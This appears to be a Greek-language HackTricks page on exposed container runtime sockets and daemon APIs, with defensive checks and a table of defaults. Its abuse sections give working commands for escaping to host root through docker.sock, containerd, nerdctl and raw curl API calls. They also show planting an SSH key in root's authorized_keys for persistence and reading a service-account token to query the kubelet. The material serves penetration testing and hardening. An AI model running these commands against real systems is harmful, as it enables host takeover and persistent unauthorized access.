# Έκθεση Runtime API και Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Πολλές πραγματικές παραβιάσεις containers δεν ξεκινούν καθόλου με namespace escape. Ξεκινούν με πρόσβαση στο control plane του runtime. Αν ένα workload μπορεί να επικοινωνήσει με τα `dockerd`, `containerd`, CRI-O, Podman ή kubelet μέσω ενός mounted Unix socket ή ενός εκτεθειμένου TCP listener, ο attacker μπορεί να έχει τη δυνατότητα να ζητήσει ένα νέο container με αυξημένα privileges, να κάνει mount το filesystem του host, να ενταχθεί στα host namespaces ή να ανακτήσει ευαίσθητες πληροφορίες του node. Σε αυτές τις περιπτώσεις, το runtime API αποτελεί το πραγματικό security boundary και η παραβίασή του είναι λειτουργικά σχεδόν ισοδύναμη με την παραβίαση του host.

Γι' αυτό η έκθεση του runtime socket θα πρέπει να τεκμηριώνεται ξεχωριστά από τις kernel protections. Ένα container με συνηθισμένο seccomp, capabilities και MAC confinement μπορεί και πάλι να απέχει μόλις ένα API call από την παραβίαση του host, αν το `/var/run/docker.sock` ή το `/run/containerd/containerd.sock` είναι mounted μέσα σε αυτό. Η kernel isolation του τρέχοντος container μπορεί να λειτουργεί ακριβώς όπως έχει σχεδιαστεί, ενώ το runtime management plane παραμένει πλήρως εκτεθειμένο.

## Μοντέλα Πρόσβασης Daemon

Το Docker Engine παραδοσιακά εκθέτει το privileged API του μέσω του τοπικού Unix socket στο `unix:///var/run/docker.sock`. Ιστορικά έχει επίσης εκτεθεί απομακρυσμένα μέσω TCP listeners, όπως το `tcp://0.0.0.0:2375`, ή μέσω TLS-protected listener στη θύρα `2376`. Η απομακρυσμένη έκθεση του daemon χωρίς ισχυρό TLS και client authentication μετατρέπει ουσιαστικά το Docker API σε remote root interface.

Τα containerd, CRI-O, Podman και kubelet εκθέτουν παρόμοιες επιφάνειες υψηλού αντίκτυπου. Τα ονόματα και τα workflows διαφέρουν, αλλά η λογική όχι. Αν το interface επιτρέπει στον caller να δημιουργεί workloads, να κάνει mount paths του host, να ανακτά credentials ή να τροποποιεί running containers, τότε αποτελεί privileged management channel και θα πρέπει να αντιμετωπίζεται ανάλογα.

Συνηθισμένα local paths που αξίζει να ελεγχθούν είναι:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Παλαιότερα ή πιο εξειδικευμένα stacks ενδέχεται επίσης να εκθέτουν endpoints όπως `dockershim.sock`, `frakti.sock` ή `rktlet.sock`. Αυτά είναι λιγότερο συνηθισμένα σε σύγχρονα περιβάλλοντα, αλλά όταν εντοπίζονται θα πρέπει να αντιμετωπίζονται με την ίδια προσοχή, επειδή αντιπροσωπεύουν επιφάνειες ελέγχου του runtime και όχι συνηθισμένα application sockets.

## Secure Remote Access

Αν ένα daemon πρέπει να εκτεθεί πέρα από το local socket, η σύνδεση θα πρέπει να προστατεύεται με TLS και κατά προτίμηση με mutual authentication, ώστε το daemon να επαληθεύει τον client και ο client να επαληθεύει το daemon. Η παλιά συνήθεια να ανοίγει το Docker daemon μέσω plain HTTP για λόγους ευκολίας αποτελεί ένα από τα πιο επικίνδυνα λάθη στη διαχείριση containers, επειδή η επιφάνεια του API είναι αρκετά ισχυρή ώστε να δημιουργεί απευθείας privileged containers.

Το ιστορικό μοτίβο διαμόρφωσης του Docker έμοιαζε ως εξής:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Σε hosts που βασίζονται στο systemd, η επικοινωνία με το daemon μπορεί επίσης να εμφανίζεται ως `fd://`, δηλαδή η διεργασία κληρονομεί ένα socket που έχει ανοίξει εκ των προτέρων το systemd, αντί να το κάνει bind απευθείας η ίδια. Το σημαντικό συμπέρασμα δεν είναι η ακριβής σύνταξη, αλλά η συνέπεια στην ασφάλεια. Από τη στιγμή που το daemon ακούει πέρα από ένα local socket με αυστηρά περιορισμένα permissions, η ασφάλεια μεταφοράς και η authentication των clients γίνονται υποχρεωτικές και όχι προαιρετικό hardening.

## Abuse

Αν υπάρχει runtime socket, επιβεβαιώστε ποιο είναι, αν υπάρχει compatible client και αν είναι δυνατή η πρόσβαση μέσω raw HTTP ή gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Αυτές οι εντολές είναι χρήσιμες επειδή διακρίνουν μεταξύ μιας ανενεργής διαδρομής, ενός προσαρτημένου αλλά μη προσβάσιμου socket και ενός ενεργού privileged API. Αν ο client ολοκληρώσει με επιτυχία, το επόμενο ερώτημα είναι αν το API μπορεί να εκκινήσει ένα νέο container με host bind mount ή κοινή χρήση host namespace.

### Όταν δεν είναι εγκατεστημένος κανένας Client

Η απουσία των `docker`, `podman` ή κάποιου άλλου friendly CLI δεν σημαίνει ότι το socket είναι ασφαλές. Το Docker Engine χρησιμοποιεί HTTP μέσω του Unix socket του, ενώ το Podman εκθέτει τόσο ένα Docker-compatible API όσο και ένα Libpod-native API μέσω του `podman system service`. Αυτό σημαίνει ότι ένα minimal περιβάλλον με μόνο `curl` μπορεί και πάλι να επαρκεί για τον έλεγχο του daemon:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Αυτό είναι σημαντικό κατά το post-exploitation, επειδή οι defenders μερικές φορές αφαιρούν τα συνηθισμένα client binaries, αλλά αφήνουν προσαρτημένο το management socket. Σε hosts με Podman, θυμηθείτε ότι το high-value path διαφέρει μεταξύ rootful και rootless deployments: `unix:///run/podman/podman.sock` για rootful service instances και `unix://$XDG_RUNTIME_DIR/podman/podman.sock` για rootless ones.

### Πλήρες παράδειγμα: Docker Socket σε Host Root

Αν το `docker.sock` είναι προσβάσιμο, το κλασικό escape είναι η εκκίνηση ενός νέου container που προσαρτά το root filesystem του host και, στη συνέχεια, η εκτέλεση `chroot` σε αυτό:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Αυτό παρέχει άμεση εκτέλεση ως root του host μέσω του Docker daemon. Ο αντίκτυπος δεν περιορίζεται στην ανάγνωση αρχείων. Μόλις εισέλθει στο νέο container, ο attacker μπορεί να τροποποιήσει αρχεία του host, να συλλέξει credentials, να εγκαταστήσει persistence ή να εκκινήσει επιπλέον privileged workloads.

### Πλήρες Παράδειγμα: Docker Socket σε Host Namespaces

Αν ο attacker προτιμά την είσοδο σε namespaces αντί για πρόσβαση μόνο στο filesystem:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Αυτό το μονοπάτι φτάνει στον host ζητώντας από το runtime να δημιουργήσει ένα νέο container με ρητή έκθεση των host namespaces, αντί να εκμεταλλεύεται το υπάρχον.

### Docker Socket Persistence Pattern

Ο έλεγχος του runtime μπορεί επίσης να χρησιμοποιηθεί για persistence αντί για ένα one-shot shell. Το γενικό μοτίβο είναι η δημιουργία ενός helper container με host mount, η εγγραφή authorized access material ή ενός startup hook στο mounted filesystem του host και, στη συνέχεια, η επαλήθευση ότι ο host το καταναλώνει.

Example shape:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
Η ίδια ιδέα μπορεί να στοχεύσει systemd units, cron fragments, application startup files ή SSH keys, ανάλογα με το τι θέλει να αποδείξει ο operator. Το σημαντικό σημείο είναι ότι η persistent αλλαγή πραγματοποιείται μέσω της host-level filesystem authority του runtime daemon και όχι μέσω επιπλέον privilege στο αρχικό container.

### Raw Docker API Helper Pivot

Όταν λείπει το Docker CLI, η ίδια ροή host-mount helper μπορεί να εκτελεστεί μέσω HTTP πάνω από το Unix socket. Η γενική ροή είναι: επιβεβαίωση του API, δημιουργία helper container με host bind mount, εκκίνησή του, δημιουργία exec instance και εκκίνηση αυτού του exec.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
Το τελικό αίτημα `/exec/<id>/start` εξαρτάται από το επιστρεφόμενο exec ID, αλλά το ζήτημα ασφάλειας είναι ανεξάρτητο από την ακριβή JSON διασύνδεση: η απευθείας πρόσβαση API σε έναν rootful Docker daemon αρκεί για την αίτηση ενός ισχυρότερου helper workload.

### Πλήρες Παράδειγμα: containerd Socket

Ένα προσαρτημένο `containerd` socket είναι συνήθως εξίσου επικίνδυνο:<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Αν υπάρχει ένας client πιο κοντά στο Docker, το `nerdctl` μπορεί να είναι πιο βολικό από το `ctr`, επειδή παρέχει οικείες παραμέτρους, όπως `--privileged`, `--pid=host` και `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Ο αντίκτυπος είναι και πάλι το host compromise. Ακόμη και αν απουσιάζουν εργαλεία ειδικά για το Docker, κάποιο άλλο runtime API μπορεί να προσφέρει την ίδια διαχειριστική ισχύ. Σε Kubernetes nodes, το `crictl` μπορεί επίσης να επαρκεί για reconnaissance και container interaction, επειδή επικοινωνεί απευθείας με το CRI endpoint.

### BuildKit Socket

Το `buildkitd` είναι εύκολο να παραβλεφθεί, επειδή συχνά θεωρείται «απλώς το build backend», όμως το daemon εξακολουθεί να αποτελεί privileged control plane. Ένα προσβάσιμο `buildkitd.sock` μπορεί να επιτρέψει σε έναν attacker να εκτελέσει arbitrary build steps, να επιθεωρήσει τις δυνατότητες του worker, να χρησιμοποιήσει local contexts από το compromised environment και να ζητήσει επικίνδυνα entitlements, όπως `network.host` ή `security.insecure`, όταν το daemon έχει ρυθμιστεί ώστε να τα επιτρέπει.

Οι χρήσιμες πρώτες αλληλεπιδράσεις είναι:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Εάν το daemon αποδέχεται build requests, ελέγξτε εάν είναι διαθέσιμα insecure entitlements:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Ο ακριβής αντίκτυπος εξαρτάται από τη ρύθμιση του daemon, αλλά μια rootful υπηρεσία BuildKit με permissive entitlements δεν είναι μια αβλαβής ευκολία για developers. Αντιμετωπίστε την ως μια ακόμη επιφάνεια διαχειριστικής πρόσβασης υψηλής αξίας, ιδιαίτερα σε CI runners και κοινόχρηστους build nodes.

### Kubelet API μέσω TCP

Το kubelet δεν είναι container runtime, αλλά εξακολουθεί να αποτελεί μέρος του επιπέδου διαχείρισης του node και συχνά εμπίπτει στην ίδια συζήτηση σχετικά με τα όρια εμπιστοσύνης. Αν η secure port `10250` του kubelet είναι προσβάσιμη από το workload ή αν εκτεθούν node credentials, kubeconfigs ή δικαιώματα proxy, ο attacker ενδέχεται να μπορεί να απαριθμήσει Pods, να ανακτήσει logs ή να εκτελέσει εντολές σε containers τοπικά στο node, χωρίς να αγγίξει ποτέ τη διαδρομή admission του Kubernetes API server.

Ξεκινήστε με φθηνό discovery:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Εάν το kubelet ή η διαδρομή proxy του API-server εξουσιοδοτεί το `exec`, ένας client με υποστήριξη WebSocket μπορεί να το μετατρέψει σε code execution σε άλλα containers του node. Αυτός είναι επίσης ο λόγος για τον οποίο το `nodes/proxy` με μόνο permission `get` είναι πιο επικίνδυνο απ’ όσο φαίνεται: το request μπορεί και πάλι να φτάσει σε kubelet endpoints που εκτελούν commands, ενώ αυτές οι απευθείας αλληλεπιδράσεις με το kubelet δεν εμφανίζονται στα κανονικά Kubernetes audit logs.<sup>[[2]](#references)</sup>

## Έλεγχοι

Στόχος αυτών των ελέγχων είναι να διαπιστωθεί εάν το container μπορεί να φτάσει σε οποιοδήποτε management plane που θα έπρεπε να παραμένει εκτός του trust boundary.
```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Τι είναι ενδιαφέρον εδώ:

- Ένα mounted runtime socket είναι συνήθως ένα άμεσο administrative primitive και όχι απλώς αποκάλυψη πληροφοριών.
- Ένας TCP listener στη `2375` χωρίς TLS πρέπει να αντιμετωπίζεται ως συνθήκη remote compromise.
- Μεταβλητές περιβάλλοντος όπως η `DOCKER_HOST` συχνά αποκαλύπτουν ότι το workload σχεδιάστηκε σκόπιμα για να επικοινωνεί με το host runtime.

## Runtime Defaults

| Runtime / platform | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνήθης χειροκίνητη αποδυνάμωση |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket by default | Το `dockerd` ακούει στο local socket και το daemon είναι συνήθως rootful | mounting του `/var/run/docker.sock`, έκθεση του `tcp://...:2375`, αδύναμο ή ανύπαρκτο TLS στο `2376` |
| Podman | Daemonless CLI by default | Δεν απαιτείται long-lived privileged daemon για ordinary local use· τα API sockets μπορεί να εκτεθούν όταν είναι ενεργοποιημένο το `podman system service` | έκθεση του `podman.sock`, ευρεία εκτέλεση του service, rootful API use |
| containerd | Local privileged socket | Το administrative API εκτίθεται μέσω του local socket και συνήθως χρησιμοποιείται από higher-level tooling | mounting του `containerd.sock`, ευρεία πρόσβαση μέσω `ctr` ή `nerdctl`, έκθεση privileged namespaces |
| CRI-O | Local privileged socket | Το CRI endpoint προορίζεται για trusted components τοπικά στον node | mounting του `crio.sock`, έκθεση του CRI endpoint σε untrusted workloads |
| Kubernetes kubelet | Node-local management API | Το Kubelet δεν πρέπει να είναι ευρέως προσβάσιμο από Pods· η πρόσβαση μπορεί να εκθέσει pod state, credentials και execution features, ανάλογα με το authn/authz | mounting kubelet sockets ή certs, weak kubelet auth, host networking σε συνδυασμό με προσβάσιμο kubelet endpoint |

## References

- [1] [εκμετάλλευση socket containerd μέρος 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Κίνδυνοι παράκαμψης του Kubernetes API Server](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
